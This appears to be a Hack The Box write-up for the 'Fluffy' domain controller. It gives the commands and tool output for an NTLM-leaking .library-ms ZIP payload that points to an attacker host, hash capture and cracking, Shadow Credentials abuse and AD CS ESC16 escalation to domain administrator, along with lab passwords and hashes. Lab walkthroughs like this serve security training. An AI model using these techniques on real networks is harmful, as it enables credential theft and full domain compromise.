# Summary 

- Initial foothold was achieved through SMB access + malicious ZIP exploit (CVE-2025-24054).
- Enumeration via BloodHound revealed misconfigured rights (GenericAll / GenericWrite) on service accounts.
- Shadow Credentials enabled lateral movement into winrm_svc.
- AD CS misconfiguration (ESC16) allowed escalation to Domain Administrator.
# Recon

I always start HTB machines with a basic nmap scan. Itâ€™s quick and provides a lot of useful information. If I get stuck, I usually run more comprehensive scans in the background.

```bash
sudo nmap -sC -sV IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 17:58 +01

```

so from the output we see Multiple AD related ports are open, The host found is `DC01.fluffy.htb`, clearly a domain controller in the `fluffy.htb` Active Directory domain.

dont forget to add `10.10.11.69    fluffy.htb    DC01.fluffy.htb    DC01` to your `/etc/hosts`

`j.fleischman / J0elTHEM4n1990!`
## Port 445

With valid credentials, I checked accessible SMB shares:

```sh
smbmap -H 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!'

```

I grabbed the PDF and it's look like instructions to upgrade all systems vulnerable to some cve

![](Season%208%20-%20Fluffy.png)

Did some research to know more, I found **CVE-2025-24054** (previously CVE-2025-24071), which allows **NTLM hash disclosure via `.library-ms` files inside ZIP archives**.
basically when such a file is extracted, Windows Explorer attempts to access a remote SMB path, leaking NTLM authentication.

The IT share already contained extracted ZIP files, which suggested that anything we upload here will automatically be unzipped. but we are not  sure is the machine still vulnerable to that cve

I crafted a malicious `.library-ms` file pointing to my attacker machine:

```bash
echo '<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\10.10.14.134\\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>' > document.library-ms && zip exploit.zip document.library-ms && rm document.library-ms
```

Started Responder to capture hashes:

```bash
sudo responder -I tun0 -wvF
```

put the zip file into the share and wait, and we did get some reply : 

![](Season%208%20-%20Fluffy-1.png)
let's try to crack it with `hashcat`
```sh
hashcat ./net-ntlmv2.hash /usr/share/wordlists/rockyou.txt
```

and we got the password
Testing access showed `p.agila` could authenticate over SMB and LDAP
![](Season%208%20-%20Fluffy-2.png)

I dumped data for BloodHound:

```sh
rusthound-ce --domain fluffy.htb -u p.agila -p 'prometheusx-303'
```

![](Season%208%20-%20Fluffy-3.png)
don't forget to do `sudo ntpdate 10.10.11.69` to update your clock

After importing into BloodHound, I saw that **p.agila** had **GenericAll rights over the "service accounts" group**.

![](Season%208%20-%20Fluffy-4.png)

Additionally, `service accounts` had `GenericWrite` rights over several service accounts.

![](Season%208%20-%20Fluffy-5.png)

with winrm_svc we can gain access to the machine and get the user flag

what about the CA_SVC account?? from my little experience with htb labs, i know any certificate account is a valuable target, and here we can see it's a cert publishers

![](Season%208%20-%20Fluffy-6.png)
# access to winrm_svc

with genericWrite over group I used `bloodyAD` to add `p.agila` into the `service accounts` group:
```bash
bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
[+] p.agila added to service accounts
```

then with service accounts access we can do shadow credentiel to get ntlm hash
where did i know about shadow credentiel? with genericWrite rights i searched what i can do with that found this [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write) then from here i've gone to dig deeper in the shadow part [DACL misconfiguration: are your data vulnerable to a Shadow Credentials cyberattack](https://i-tracing.com/blog/dacl-shadow-credentials/)

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc

```

From there i can Pth to the account and get the flag

![](Season%208%20-%20Fluffy-8.png)

# Path to root

going back to cv_svc account let's grap its ntlm

```bash
certipy-ad shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
```

and use the lover certipy to see what we can find

```

### Abusing ESC16

this is article have really valuable info about this [AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

let's update cv_svc account to imporsanate administrator
```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

that give us access to request certificates for theÂ `administrator`

```bash
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
```

This issued a certificate with administrator privileges.
cleanup :

```bash
certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

now let's use the certificate to get the administrator hash
```bash
certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:

[*] Trying to get TGT...

[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b514
```
and voila
